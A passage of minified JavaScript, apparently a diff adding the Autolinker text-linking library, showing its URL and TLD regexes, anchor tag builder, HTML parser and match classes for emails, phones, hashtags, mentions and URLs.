\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19\\-]*[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19])?))|(?:" + 
+  RegExp("(?:[0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19]{1,3}\\.){3}[0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19]{1,3}").source + 
+  "))")};
+  b.AnchorTagBuilder = b.Util.extend(Object, {constructor:function(a) {
+    a = a || {};
+    this.newWindow = a.newWindow;
+    this.truncate = a.truncate;
+    this.className = a.className;
+  }, build:function(a) {
+    return new b.HtmlTag({tagName:"a", attrs:this.createAttrs(a), innerHtml:this.processAnchorText(a.getAnchorText())});
+  }, createAttrs:function(a) {
+    var c = {href:a.getAnchorHref()}, b = this.createCssClass(a);
+    b && (c["class"] = b);
+    this.newWindow && (c.target = "_blank", c.rel = "noopener noreferrer");
+    this.truncate && this.truncate.length && this.truncate.length < a.getAnchorText().length && (c.title = a.getAnchorHref());
+    return c;
+  }, createCssClass:function(a) {
+    var c = this.className;
+    if (c) {
+      var b = [c];
+      a = a.getCssClassSuffixes();
+      for (var f = 0, e = a.length; f < e; f++) {
+        b.push(c + "-" + a[f]);
+      }
+      return b.join(" ");
+    }
+    return "";
+  }, processAnchorText:function(a) {
+    return a = this.doTruncate(a);
+  }, doTruncate:function(a) {
+    var c = this.truncate;
+    if (!c || !c.length) {
+      return a;
+    }
+    var d = c.length;
+    c = c.location;
+    return "smart" === c ? b.truncate.TruncateSmart(a, d) : "middle" === c ? b.truncate.TruncateMiddle(a, d) : b.truncate.TruncateEnd(a, d);
+  }});
+  b.htmlParser.HtmlParser = b.Util.extend(Object, {htmlRegex:function() {
+    var a = /[0-9a-zA-Z][0-9a-zA-Z:]*/, c = /(?:"[^"]*?"|'[^']*?'|[^'"=<>`\s]+)/, b = /[^\s"'>\/=\x00-\x1F\x7F]+/.source + "(?:\\s*=\\s*" + c.source + ")?";
+    return new RegExp(["(?:<(!DOCTYPE)(?:\\s+(?:", b, "|", c.source + ")", ")*>)|(?:<(/)?(?:", /!--([\s\S]+?)--/.source, "|(?:", "(" + a.source + ")", "\\s*/?)|(?:", "(" + a.source + ")", "\\s+(?:(?:\\s+|\\b)", b, ")*\\s*/?))>)"].join(""), "gi");
+  }(), htmlCharacterEntitiesRegex:/(&nbsp;|&#160;|&lt;|&#60;|&gt;|&#62;|&quot;|&#34;|&#39;)/gi, parse:function(a) {
+    for (var c = this.htmlRegex, b, f = 0, e = []; null !== (b = c.exec(a));) {
+      var l = b[0], k = b[3], h = b[1] || b[4] || b[5], g = !!b[2];
+      b = b.index;
+      var m = a.substring(f, b);
+      m && (f = this.parseTextAndEntityNodes(f, m), e.push.apply(e, f));
+      k ? e.push(this.createCommentNode(b, l, k)) : e.push(this.createElementNode(b, l, h, g));
+      f = b + l.length;
+    }
+    f < a.length && (a = a.substring(f)) && (f = this.parseTextAndEntityNodes(f, a), f.forEach(function(a) {
+      e.push(a);
+    }));
+    return e;
+  }, parseTextAndEntityNodes:function(a, c) {
+    for (var d = [], f = b.Util.splitAndCapture(c, this.htmlCharacterEntitiesRegex), e = 0, l = f.length; e < l; e += 2) {
+      var k = f[e], h = f[e + 1];
+      k && (d.push(this.createTextNode(a, k)), a += k.length);
+      h && (d.push(this.createEntityNode(a, h)), a += h.length);
+    }
+    return d;
+  }, createCommentNode:function(a, c, d) {
+    return new b.htmlParser.CommentNode({offset:a, text:c, comment:b.Util.trim(d)});
+  }, createElementNode:function(a, c, d, f) {
+    return new b.htmlParser.ElementNode({offset:a, text:c, tagName:d.toLowerCase(), closing:f});
+  }, createEntityNode:function(a, c) {
+    return new b.htmlParser.EntityNode({offset:a, text:c});
+  }, createTextNode:function(a, c) {
+    return new b.htmlParser.TextNode({offset:a, text:c});
+  }});
+  b.htmlParser.HtmlNode = b.Util.extend(Object, {offset:void 0, text:void 0, constructor:function(a) {
+    b.Util.assign(this, a);
+    if (null == this.offset) {
+      throw Error("`offset` cfg required");
+    }
+    if (null == this.text) {
+      throw Error("`text` cfg required");
+    }
+  }, getType:b.Util.abstractMethod, getOffset:function() {
+    return this.offset;
+  }, getText:function() {
+    return this.text;
+  }});
+  b.htmlParser.CommentNode = b.Util.extend(b.htmlParser.HtmlNode, {comment:"", getType:function() {
+    return "comment";
+  }, getComment:function() {
+    return this.comment;
+  }});
+  b.htmlParser.ElementNode = b.Util.extend(b.htmlParser.HtmlNode, {tagName:"", closing:!1, getType:function() {
+    return "element";
+  }, getTagName:function() {
+    return this.tagName;
+  }, isClosing:function() {
+    return this.closing;
+  }});
+  b.htmlParser.EntityNode = b.Util.extend(b.htmlParser.HtmlNode, {getType:function() {
+    return "entity";
+  }});
+  b.htmlParser.TextNode = b.Util.extend(b.htmlParser.HtmlNode, {getType:function() {
+    return "text";
+  }});
+  b.match.Match = b.Util.extend(Object, {constructor:function(a) {
+    if (null == a.tagBuilder) {
+      throw Error("`tagBuilder` cfg required");
+    }
+    if (null == a.matchedText) {
+      throw Error("`matchedText` cfg required");
+    }
+    if (null == a.offset) {
+      throw Error("`offset` cfg required");
+    }
+    this.tagBuilder = a.tagBuilder;
+    this.matchedText = a.matchedText;
+    this.offset = a.offset;
+  }, getType:b.Util.abstractMethod, getMatchedText:function() {
+    return this.matchedText;
+  }, setOffset:function(a) {
+    this.offset = a;
+  }, getOffset:function() {
+    return this.offset;
+  }, getAnchorHref:b.Util.abstractMethod, getAnchorText:b.Util.abstractMethod, getCssClassSuffixes:function() {
+    return [this.getType()];
+  }, buildTag:function() {
+    return this.tagBuilder.build(this);
+  }});
+  b.match.Email = b.Util.extend(b.match.Match, {constructor:function(a) {
+    b.match.Match.prototype.constructor.call(this, a);
+    if (!a.email) {
+      throw Error("`email` cfg required");
+    }
+    this.email = a.email;
+  }, getType:function() {
+    return "email";
+  }, getEmail:function() {
+    return this.email;
+  }, getAnchorHref:function() {
+    return "mailto:" + this.email;
+  }, getAnchorText:function() {
+    return this.email;
+  }});
+  b.match.Hashtag = b.Util.extend(b.match.Match, {constructor:function(a) {
+    b.match.Match.prototype.constructor.call(this, a);
+    if (!a.hashtag) {
+      throw Error("`hashtag` cfg required");
+    }
+    this.serviceName = a.serviceName;
+    this.hashtag = a.hashtag;
+  }, getType:function() {
+    return "hashtag";
+  }, getServiceName:function() {
+    return this.serviceName;
+  }, getHashtag:function() {
+    return this.hashtag;
+  }, getAnchorHref:function() {
+    var a = this.serviceName, b = this.hashtag;
+    switch(a) {
+      case "twitter":
+        return "https://twitter.com/hashtag/" + b;
+      case "facebook":
+        return "https://www.facebook.com/hashtag/" + b;
+      case "instagram":
+        return "https://instagram.com/explore/tags/" + b;
+      default:
+        throw Error("Unknown service name to point hashtag to: ", a);
+    }
+  }, getAnchorText:function() {
+    return "#" + this.hashtag;
+  }});
+  b.match.Phone = b.Util.extend(b.match.Match, {constructor:function(a) {
+    b.match.Match.prototype.constructor.call(this, a);
+    if (!a.number) {
+      throw Error("`number` cfg required");
+    }
+    if (null == a.plusSign) {
+      throw Error("`plusSign` cfg required");
+    }
+    this.number = a.number;
+    this.plusSign = a.plusSign;
+  }, getType:function() {
+    return "phone";
+  }, getNumber:function() {
+    return this.number;
+  }, getAnchorHref:function() {
+    return "tel:" + (this.plusSign ? "+" : "") + this.number;
+  }, getAnchorText:function() {
+    return this.matchedText;
+  }});
+  b.match.Mention = b.Util.extend(b.match.Match, {constructor:function(a) {
+    b.match.Match.prototype.constructor.call(this, a);
+    if (!a.serviceName) {
+      throw Error("`serviceName` cfg required");
+    }
+    if (!a.mention) {
+      throw Error("`mention` cfg required");
+    }
+    this.mention = a.mention;
+    this.serviceName = a.serviceName;
+  }, getType:function() {
+    return "mention";
+  }, getMention:function() {
+    return this.mention;
+  }, getServiceName:function() {
+    return this.serviceName;
+  }, getAnchorHref:function() {
+    switch(this.serviceName) {
+      case "twitter":
+        return "https://twitter.com/" + this.mention;
+      case "instagram":
+        return "https://instagram.com/" + this.mention;
+      default:
+        throw Error("Unknown service name to point mention to: ", this.serviceName);
+    }
+  }, getAnchorText:function() {
+    return "@" + this.mention;
+  }, getCssClassSuffixes:function() {
+    var a = b.match.Match.prototype.getCssClassSuffixes.call(this), c = this.getServiceName();
+    c && a.push(c);
+    return a;
+  }});
+  b.match.Url = b.Util.extend(b.match.Match, {constructor:function(a) {
+    b.match.Match.prototype.constructor.call(this, a);
+    if ("scheme" !== a.urlMatchType && "www" !== a.urlMatchType && "tld" !== a.urlMatchType) {
+      throw Error('`urlMatchType` cfg must be one of: "scheme", "www", or "tld"');
+    }
+    if (!a.url) {
+      throw Error("`url` cfg required");
+    }
+    if (null == a.protocolUrlMatch) {
+      throw Error("`protocolUrlMatch` cfg required");
+    }
+    if (null == a.protocolRelativeMatch) {
+      throw Error("`protocolRelativeMatch` cfg required");
+    }
+    if (null == a.stripPrefix) {
+      throw Error("`stripPrefix` cfg required");
+    }
+    if (null == a.stripTrailingSlash) {
+      throw Error("`stripTrailingSlash` cfg required");
+    }
+    if (null == a.decodePercentEncoding) {
+      throw Error("`decodePercentEncoding` cfg required");
+    }
+    this.urlMatchType = a.urlMatchType;
+    this.url = a.url;
+    this.protocolUrlMatch = a.protocolUrlMatch;
+    this.protocolRelativeMatch = a.protocolRelativeMatch;
+    this.stripPrefix = a.stripPrefix;
+    this.stripTrailingSlash = a.stripTrailingSlash;
+    this.decodePercentEncoding = a.decodePercentEncoding;
+  }, schemePrefixRegex:/^(https?:\/\/)?/i, wwwPrefixRegex:/^(https?:\/\/)?(www\.)?/i, protocolRelativeRegex:/^\/\//, protocolPrepended:!1, getType:function() {
+    return "url";
+  }, getUrlMatchType:function() {
+    return this.urlMatchType;
+  }, getUrl:function() {
+    var a = this.url;
+    this.protocolRelativeMatch || this.protocolUrlMatch || this.protocolPrepended || (a = this.url = "http://" + a, this.protocolPrepended = !0);
+    return a;
+  }, getAnchorHref:function() {
+    return this.getUrl().replace(/&amp;/g, "&");
+  }, getAnchorText:function() {
+    var a = this.getMatchedText();
+    this.protocolRelativeMatch && (a = this.stripProtocolRelativePrefix(a));
+    this.stripPrefix.scheme && (a = this.stripSchemePrefix(a));
+    this.stripPrefix.www && (a = this.stripWwwPrefix(a));
+    this.stripTrailingSlash && (a = this.removeTrailingSlash(a));
+    this.decodePercentEncoding && (a = this.removePercentEncoding(a));
+    return a;
+  }, stripSchemePrefix:function(a) {
+    return a.replace(this.schemePrefixRegex, "");
+  }, stripWwwPrefix:function(a) {
+    return a.replace(this.wwwPrefixRegex, "$1");
+  }, stripProtocolRelativePrefix:function(a) {
+    return a.replace(this.protocolRelativeRegex, "");
+  }, removeTrailingSlash:function(a) {
+    "/" === a.charAt(a.length - 1) && (a = a.slice(0, -1));
+    return a;
+  }, removePercentEncoding:function(a) {
+    try {
+      return decodeURIComponent(a.replace(/%22/gi, "&quot;").replace(/%26/gi, "&amp;").replace(/%27/gi, "&#39;").replace(/%3C/gi, "&lt;").replace(/%3E/gi, "&gt;"));
+    } catch (c) {
+      return a;
+    }
+  }});
+  b.tldRegex = /(?:xn--vermgensberatung-pwb|xn--vermgensberater-ctb|xn--clchc0ea0b2g2a9gcd|xn--w4r85el8fhu5dnra|northwesternmutual|travelersinsurance|verm\u00f6gensberatung|xn--3oq18vl8pn36a|xn--5su34j936bgsg|xn--bck1b9a5dre4c|xn--mgbai9azgqp6j|xn--mgberp4a5d4ar|xn--xkc2dl3a5ee0h|verm\u00f6gensberater|xn--fzys8d69uvgm|xn--mgba7c0bbn0a|xn--xkc2al3hye2a|americanexpress|kerryproperties|sandvikcoromant|xn--i1b6b1a6a2e|xn--kcrx77d1x4a|xn--lgbbat1ad8j|xn--mgba3a4f16a|xn--mgbc0a9azcg|xn--nqv7fs00ema|afamilycompany|americanfamily|bananarepublic|cancerresearch|cookingchannel|kerrylogistics|weatherchannel|xn--54b7fta0cc|xn--6qq986b3xl|xn--80aqecdr1a|xn--b4w605ferd|xn--fiq228c5hs|xn--jlq61u9w7b|xn--mgba3a3ejt|xn--mgbaam7a8h|xn--mgbayh7gpa|xn--mgbb9fbpob|xn--mgbbh1a71e|xn--mgbca7dzdo|xn--mgbi4ecexp|xn--mgbx4cd0ab|international|lifeinsurance|orientexpress|spreadbetting|travelchannel|wolterskluwer|xn--eckvdtc9d|xn--fpcrj9c3d|xn--fzc2c9e2c|xn--tiq49xqyj|xn--yfro4i67o|xn--ygbi2ammx|construction|lplfinancial|pamperedchef|scholarships|versicherung|xn--3e0b707e|xn--80adxhks|xn--80asehdb|xn--8y0a063a|xn--gckr3f0f|xn--mgb9awbf|xn--mgbab2bd|xn--mgbpl2fh|xn--mgbt3dhd|xn--mk1bu44c|xn--ngbc5azd|xn--ngbe9e0a|xn--ogbpf8fl|xn--qcka1pmc|accountants|barclaycard|blackfriday|blockbuster|bridgestone|calvinklein|contractors|creditunion|engineering|enterprises|foodnetwork|investments|kerryhotels|lamborghini|motorcycles|olayangroup|photography|playstation|productions|progressive|redumbrella|rightathome|williamhill|xn--11b4c3d|xn--1ck2e1b|xn--1qqw23a|xn--3bst00m|xn--3ds443g|xn--42c2d9a|xn--45brj9c|xn--55qw42g|xn--6frz82g|xn--80ao21a|xn--9krt00a|xn--cck2b3b|xn--czr694b|xn--d1acj3b|xn--efvy88h|xn--estv75g|xn--fct429k|xn--fjq720a|xn--flw351e|xn--g2xx48c|xn--gecrj9c|xn--gk3at1e|xn--h2brj9c|xn--hxt814e|xn--imr513n|xn--j6w193g|xn--jvr189m|xn--kprw13d|xn--kpry57d|xn--kpu716f|xn--mgbtx2b|xn--mix891f|xn--nyqy26a|xn--pbt977c|xn--pgbs0dh|xn--q9jyb4c|xn--rhqv96g|xn--rovu88b|xn--s9brj9c|xn--ses554g|xn--t60b56a|xn--vuq861b|xn--w4rs40l|xn--xhq521b|xn--zfr164b|\u0b9a\u0bbf\u0b99\u0bcd\u0b95\u0baa\u0bcd\u0baa\u0bc2\u0bb0\u0bcd|accountant|apartments|associates|basketball|bnpparibas|boehringer|capitalone|consulting|creditcard|cuisinella|eurovision|extraspace|foundation|healthcare|immobilien|industries|management|mitsubishi|nationwide|newholland|nextdirect|onyourside|properties|protection|prudential|realestate|republican|restaurant|schaeffler|swiftcover|tatamotors|technology|telefonica|university|vistaprint|vlaanderen|volkswagen|xn--30rr7y|xn--3pxu8k|xn--45q11c|xn--4gbrim|xn--55qx5d|xn--5tzm5g|xn--80aswg|xn--90a3ac|xn--9dbq2a|xn--9et52u|xn--c2br7g|xn--cg4bki|xn--czrs0t|xn--czru2d|xn--fiq64b|xn--fiqs8s|xn--fiqz9s|xn--io0a7i|xn--kput3i|xn--mxtq1m|xn--o3cw4h|xn--pssy2u|xn--unup4y|xn--wgbh1c|xn--wgbl6a|xn--y9a3aq|accenture|alfaromeo|allfinanz|amsterdam|analytics|aquarelle|barcelona|bloomberg|christmas|community|directory|education|equipment|fairwinds|financial|firestone|fresenius|frontdoor|fujixerox|furniture|goldpoint|goodhands|hisamitsu|homedepot|homegoods|homesense|honeywell|institute|insurance|kuokgroup|ladbrokes|lancaster|landrover|lifestyle|marketing|marshalls|mcdonalds|melbourne|microsoft|montblanc|panasonic|passagens|pramerica|richardli|scjohnson|shangrila|solutions|statebank|statefarm|stockholm|travelers|vacations|xn--90ais|xn--c1avg|xn--d1alf|xn--e1a4c|xn--fhbei|xn--j1aef|xn--j1amh|xn--l1acc|xn--nqv7f|xn--p1acf|xn--tckwe|xn--vhquv|yodobashi|abudhabi|airforce|allstate|attorney|barclays|barefoot|bargains|baseball|boutique|bradesco|broadway|brussels|budapest|builders|business|capetown|catering|catholic|chrysler|cipriani|cityeats|cleaning|clinique|clothing|commbank|computer|delivery|deloitte|democrat|diamonds|discount|discover|download|engineer|ericsson|esurance|everbank|exchange|feedback|fidelity|firmdale|football|frontier|goodyear|grainger|graphics|guardian|hdfcbank|helsinki|holdings|hospital|infiniti|ipiranga|istanbul|jpmorgan|lighting|lundbeck|marriott|maserati|mckinsey|memorial|mortgage|movistar|observer|partners|pharmacy|pictures|plumbing|property|redstone|reliance|saarland|samsclub|security|services|shopping|showtime|softbank|software|stcgroup|supplies|symantec|telecity|training|uconnect|vanguard|ventures|verisign|woodside|xn--90ae|xn--node|xn--p1ai|xn--qxam|yokohama|\u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629|abogado|academy|agakhan|alibaba|android|athleta|auction|audible|auspost|avianca|banamex|bauhaus|bentley|bestbuy|booking|brother|bugatti|capital|caravan|careers|cartier|channel|chintai|citadel|clubmed|college|cologne|comcast|company|compare|contact|cooking|corsica|country|coupons|courses|cricket|cruises|dentist|digital|domains|exposed|express|farmers|fashion|ferrari|ferrero|finance|fishing|fitness|flights|florist|flowers|forsale|frogans|fujitsu|gallery|genting|godaddy|guitars|hamburg|hangout|hitachi|holiday|hosting|hoteles|hotmail|hyundai|iselect|ismaili|jewelry|juniper|kitchen|komatsu|lacaixa|lancome|lanxess|lasalle|latrobe|leclerc|liaison|limited|lincoln|markets|metlife|monster|netbank|netflix|network|neustar|okinawa|oldnavy|organic|origins|panerai|philips|pioneer|politie|realtor|recipes|rentals|reviews|rexroth|samsung|sandvik|schmidt|schwarz|science|shiksha|shriram|singles|spiegel|staples|starhub|statoil|storage|support|surgery|systems|temasek|theater|theatre|tickets|tiffany|toshiba|trading|walmart|wanggou|watches|weather|website|wedding|whoswho|windows|winners|xfinity|yamaxun|youtube|zuerich|\u043a\u0430\u0442\u043e\u043b\u0438\u043a|\u0627